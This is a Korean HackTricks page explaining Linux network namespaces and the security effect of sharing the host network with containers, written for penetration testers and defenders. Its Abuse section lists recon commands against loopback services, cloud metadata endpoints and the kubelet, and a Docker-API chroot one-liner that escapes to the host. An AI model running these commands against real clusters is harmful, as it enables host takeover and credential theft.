# 네트워크 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

네트워크 네임스페이스는 인터페이스, IP 주소, 라우팅 테이블, ARP/neighbor 상태, 방화벽 규칙, 소켓, `/proc/net` 같은 파일의 내용 등 네트워크 관련 자원을 격리합니다. 이 때문에 컨테이너가 호스트의 실제 네트워크 스택을 소유하지 않으면서도 자체적인 `eth0`, 로컬 라우트, 루프백 장치를 가진 것처럼 보일 수 있습니다.

보안 관점에서는 네트워크 격리가 단순한 포트 바인딩 이상의 의미를 갖습니다. 프라이빗 네트워크 네임스페이스는 워크로드가 직접 관찰하거나 재구성할 수 있는 범위를 제한합니다. 해당 네임스페이스가 호스트와 공유되면, 컨테이너는 애플리케이션에 노출될 의도가 없던 호스트 리스너, 호스트 로컬 서비스, 네트워크 제어지점 등을 갑자기 볼 수 있게 됩니다.

## 동작

새로 생성된 네트워크 네임스페이스는 인터페이스가 연결되기 전까지 비어 있거나 거의 비어 있는 네트워크 환경으로 시작합니다. 컨테이너 런타임은 이후 가상 인터페이스를 생성하거나 연결하고, 주소를 할당하고, 라우트를 구성하여 워크로드가 예상한 연결성을 갖도록 합니다. 브리지 기반 배포에서는 보통 컨테이너가 호스트 브리지에 연결된 veth 기반 인터페이스를 보게 됩니다. Kubernetes에서는 CNI 플러그인이 Pod 네트워킹을 위해 동등한 설정을 처리합니다.

이 구조는 `--network=host` 또는 `hostNetwork: true`가 왜 그렇게 극적인 변화인지 설명합니다. 준비된 프라이빗 네트워크 스택을 받는 대신, 워크로드는 호스트의 실제 네트워크 스택에 합류합니다.

## 실습

거의 비어 있는 네트워크 네임스페이스는 다음으로 확인할 수 있습니다:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
다음 명령으로 일반 컨테이너와 호스트 네트워크 컨테이너를 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
호스트 네트워크를 사용하는 컨테이너는 더 이상 자체적으로 격리된 소켓 및 인터페이스 뷰를 가지지 않습니다. 이 변화만으로도 프로세스가 어떤 권한을 가지고 있는지를 묻기 전에 이미 큰 의미를 갖습니다.

## Runtime Usage

Docker와 Podman은 일반적으로 각 컨테이너마다 별도의 네트워크 네임스페이스를 생성합니다(다르게 구성되지 않는 한). Kubernetes는 보통 각 Pod에 자체 네트워크 네임스페이스를 부여하며, 그 안의 컨테이너들이 이를 공유하지만 호스트와는 분리됩니다. Incus/LXC 시스템도 네트워크 네임스페이스 기반의 풍부한 격리를 제공하며, 종종 더 다양한 가상 네트워킹 구성을 지원합니다.

공통 원칙은 프라이빗 네트워킹이 기본 격리 경계이며, 호스트 네트워킹은 그 경계에서 명시적으로 벗어나는 선택이라는 점입니다.

## Misconfigurations

가장 중요한 잘못된 구성은 단순히 호스트 네트워크 네임스페이스를 공유하는 것입니다. 이는 성능, 저수준 모니터링 또는 편의성 때문에 가끔 사용되지만, 컨테이너에 제공되는 가장 명확한 경계 중 하나를 제거합니다. 호스트 로컬 리스너가 더 직접적으로 접근 가능해지고, localhost 전용 서비스가 노출될 수 있으며, `CAP_NET_ADMIN` 또는 `CAP_NET_RAW` 같은 권한은 이제 호스트의 네트워크 환경에 적용되기 때문에 훨씬 더 위험해집니다.

또 다른 문제는 네트워크 네임스페이스가 프라이빗일 때조차 네트워크 관련 권한을 과도하게 부여하는 것입니다. 프라이빗 네임스페이스가 도움이 되긴 하지만, raw socket이나 고급 네트워크 제어를 무해하게 만들지는 않습니다.

Kubernetes에서 `hostNetwork: true`는 Pod 수준의 네트워크 분할에 대한 신뢰도에도 변화를 줍니다. Kubernetes 문서는 많은 네트워크 플러그인이 `podSelector` / `namespaceSelector` 매칭을 위해 `hostNetwork` Pod 트래픽을 제대로 구분하지 못하고 일반 노드 트래픽으로 취급한다고 설명합니다. 공격자의 관점에서는, 손상된 `hostNetwork` 워크로드를 오버레이 네트워크 워크로드와 동일한 정책 가정 안에 있는 일반 Pod로 보기보다는 노드 수준의 네트워크 발판으로 간주하는 것이 더 안전합니다.

## Abuse

격리 수준이 약한 환경에서는 공격자가 호스트의 리스닝 서비스들을 조사하거나, loopback에만 바인딩된 관리 엔드포인트에 접근하거나, 정확한 권한과 환경에 따라 트래픽을 스니핑하거나 방해하거나, `CAP_NET_ADMIN`이 있으면 라우팅 및 방화벽 상태를 재구성할 수 있습니다. 클러스터 환경에서는 이것이 측면 이동(lateral movement)과 컨트롤 플레인 정찰을 더 쉽게 만들 수 있습니다.

호스트 네트워킹이 의심되면, 먼저 보이는 인터페이스와 리스너가 격리된 컨테이너 네트워크가 아니라 호스트에 속하는지 확인하는 것부터 시작하세요:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only 서비스는 종종 첫 번째로 흥미로운 발견입니다:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
네트워크 권한(capabilities)이 있는 경우, 워크로드가 노출된 스택을 검사하거나 변경할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
최신 커널에서 호스트 네트워킹과 `CAP_NET_ADMIN`은 단순한 `iptables` / `nftables` 변경을 넘어 패킷 경로를 노출시킬 수 있습니다. `tc`의 qdiscs와 필터도 네임스페이스 범위이므로, 호스트 네트워크 네임스페이스를 공유하면 컨테이너가 볼 수 있는 호스트 인터페이스에 적용됩니다. 추가로 `CAP_BPF`가 있으면 TC 및 XDP 로더와 같은 네트워크 관련 eBPF 프로그램도 관련됩니다:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
이것은 공격자가 단순히 방화벽 규칙을 재작성하는 것뿐만 아니라 호스트 인터페이스 수준에서 트래픽을 미러링, 리디렉션, 셰이핑 또는 드롭할 수 있기 때문에 중요합니다. 프라이빗 네트워크 네임스페이스에서는 이러한 동작이 컨테이너 관점으로 제한되지만, 호스트 네임스페이스를 공유하면 호스트에 영향을 미치게 됩니다.

클러스터 또는 클라우드 환경에서는 호스트 네트워킹 때문에 메타데이터와 control-plane 인접 서비스에 대한 빠른 로컬 recon 또한 정당화됩니다:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 전체 예시: Host Networking + Local Runtime / Kubelet Access

호스트 네트워킹은 자동으로 호스트 루트 권한을 제공하지는 않지만, 종종 노드 자체에서만 의도적으로 접근 가능한 서비스들을 노출합니다. 그 중 하나의 서비스가 보호가 약하면, 호스트 네트워킹은 직접적인 privilege-escalation 경로가 됩니다.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost의 Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
영향:

- 적절한 보호 없이 로컬 런타임 API가 노출되면 호스트 직접 침해 가능
- kubelet 또는 로컬 에이전트에 접근할 수 있으면 클러스터 정찰 또는 횡적 이동 가능
- `CAP_NET_ADMIN`과 결합되면 트래픽 조작 또는 denial of service가 발생할 수 있음

## Checks

이 검사들의 목적은 프로세스가 사설 네트워크 스택을 가지고 있는지, 어떤 라우트와 리스너가 보이는지, 그리고 capabilities를 실제로 테스트하기 전에 네트워크 뷰가 이미 호스트처럼 보이는지를 파악하는 것이다.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
여기서 흥미로운 점:

- 만약 `/proc/self/ns/net`와 `/proc/1/ns/net`가 이미 호스트와 유사하게 보인다면, 컨테이너가 호스트 네트워크 네임스페이스를 공유하거나 다른 비공개 네임스페이스를 사용하고 있을 수 있습니다.
- `lsns -t net`와 `ip netns identify`는 셸이 이미 이름이 지정된 또는 지속적인 네임스페이스 안에 있고 호스트 측의 `/run/netns` 객체와 이를 연관시키고 싶을 때 유용합니다.
- `ss -lntup`는 루프백 전용 리스너와 로컬 관리 엔드포인트를 드러내기 때문에 특히 유용합니다.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments는 `CAP_NET_ADMIN`, `CAP_NET_RAW`, 또는 `CAP_BPF`가 존재할 경우 훨씬 더 중요해집니다.
- Kubernetes에서 `hostNetwork` Pod에서 서비스 이름 해석이 실패하는 것은 단순히 그 Pod가 `dnsPolicy: ClusterFirstWithHostNet`를 사용하지 않기 때문일 수 있으며, 서비스가 없는 것을 의미하지는 않습니다.

컨테이너를 검토할 때는 항상 네트워크 네임스페이스와 capability 세트를 함께 평가하세요. 호스트 네트워킹과 강력한 네트워크 권한이 결합된 상태는 브리지 네트워킹과 좁은 기본 capability 세트가 결합된 상태와 매우 다른 보안 태세입니다.

## 참조

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
